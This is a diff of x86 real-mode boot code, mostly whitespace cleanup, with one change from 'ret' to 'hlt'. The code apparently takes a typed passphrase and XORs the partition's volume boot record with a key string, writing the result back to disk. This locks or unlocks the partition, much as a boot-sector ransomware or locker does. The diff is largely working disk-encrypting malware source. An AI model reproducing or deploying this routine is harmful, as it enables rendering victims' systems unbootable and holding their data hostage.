@@ -24,30 +24,30 @@ _start:
     pusha
 
     mov BYTE [drive_type], dl
-    
+
     call _check_input
-    
+
     popa
     retf
-    
+
 _encrypt:
     call _check_partition
     xor WORD [VBR_ADDR + SIGNATURE_OFFSET], 0xaa55
     jz _xor
-    
+
     mov si, secret
     call _print_str
-    
+
     ret
 
 _decrypt:
     call _check_partition
     cmp WORD [VBR_ADDR + SIGNATURE_OFFSET], 0xaa55
     jnz _xor
-    
+
     mov si, xor_string
     call _print_str
-    
+
     ret
 
 _check_partition:
@@ -94,7 +94,7 @@ _check_extensions:
 _read_with_lba:
     call _read_sector_lba
     add sp, 0x10
-    
+
     ret
 
 _read_with_chs:
@@ -105,7 +105,7 @@ _read_with_chs:
     mov cl, BYTE [bp + 0x3]         ; sector
     mov bx, VBR_ADDR                ; addr to store the VBR
     call _read_sector
-    
+
     ret
 
 _reset_disk:
@@ -168,11 +168,11 @@ _check_input:
 _in_loop:
 	cli
 	xor ax, ax
-    int 16h                 ; get_key interrupt 
-	
+    int 16h                 ; get_key interrupt
+
 	mov dl, al              ; get_key places next keypress into al
 	mov [buf], dl	    	; move char entered by user into buf
-	
+
 	mov cl, BYTE [secret + bx]
 	or  cl, cl
 	jz  _decrypt
@@ -180,7 +180,7 @@ _in_loop:
 	jnz _encrypt
 	inc bx
 	xor cx, cx
-	 
+
 	mov si, buf             ; SI now points to our message
 _out_loop:
     lodsb                   ; Loads SI into AL and increments SI [next char]
@@ -200,14 +200,14 @@ _xor:
     mov cl, BYTE [bp + 0x3]     ; sector to read from
     mov bx, VBR_ADDR            ; where to store the sector we read
     call _read_sector
-    
+
     ; xor the vbr
     lea di, [VBR_ADDR]
     xor bx, bx                  ; use bx as counter
 _xor_loop:
     cmp bx, 0x200               ; loop 512 times ~ a sector/the vbr
     jge _xor_end
-    
+
     ; mod the counter to repeat xor string
     xor dx, dx                  ; dx contains remainder
     mov ax, bx                  ; load current counter/index to ax
@@ -221,12 +221,12 @@ _xor_loop:
     mov cl, BYTE [di + bx]      ; use current counter to index to entry/memory
     xor al, cl
     mov [di + bx], al
-    
+
     inc bx
     jmp _xor_loop
 _xor_end:
     xor ax, ax                  ; null out registers else error
-    
+
     ; write the local copy of the partition onto the disk
     mov dl, BYTE [drive_type]
     mov bp, WORD [part_offset]
@@ -236,7 +236,7 @@ _xor_end:
     mov cl, BYTE [bp + 0x3]     ; sector to write to
     mov bx, VBR_ADDR            ; where the sector we want to write to
     call _write_sector
-    ret
+    hlt
 
 _end_loop:                  ; after printing an error, we should just loop forever
     jmp _end_loop
